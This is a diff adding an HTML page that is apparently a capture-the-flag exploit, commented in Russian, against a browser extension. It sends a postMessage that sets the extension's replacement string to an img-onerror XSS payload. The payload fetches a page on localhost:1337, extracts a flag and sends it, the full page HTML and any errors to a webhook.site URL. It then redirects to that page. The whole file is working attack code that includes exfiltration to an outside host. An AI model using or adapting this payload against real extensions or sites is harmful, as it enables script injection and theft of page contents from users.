@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+    <script>
+        // Получите свой webhook на https://webhook.site
+        const WEBHOOK_URL = 'https://webhook.site/d80fe4d3-6b9d-41de-ad39-0b57acc841c1';
+        
+        const payload = `<img src=x onerror="
+            fetch('http://localhost:1337')
+                .then(r => r.text())
+                .then(html => {
+                    const flagMatch = html.match(/flag\\{[^}]+\\}/);
+                    if (flagMatch) {
+                        const flag = flagMatch[0];
+                        fetch('${WEBHOOK_URL}?flag=' + encodeURIComponent(flag));
+                    }
+                    // Также отправим всю страницу для отладки
+                    fetch('${WEBHOOK_URL}', {
+                        method: 'POST',
+                        body: 'Page content: ' + document.documentElement.outerHTML
+                    });
+                })
+                .catch(err => {
+                    fetch('${WEBHOOK_URL}?error=' + encodeURIComponent(err.toString()));
+                })
+        ">`;
+
+        // Ждем загрузки расширения
+        setTimeout(() => {
+            // Устанавливаем вредоносный replacementString
+            window.postMessage({
+                type: "SET",
+                replacementString: payload
+            }, "*");
+            
+            console.log("Payload установлен, перенаправляю на localhost:1337...");
+            
+            // Переходим на страницу с флагом
+            setTimeout(() => {
+                window.location.href = 'http://localhost:1337';
+            }, 200);
+            
+        }, 1000);
+    </script>
+</body>
+</html>
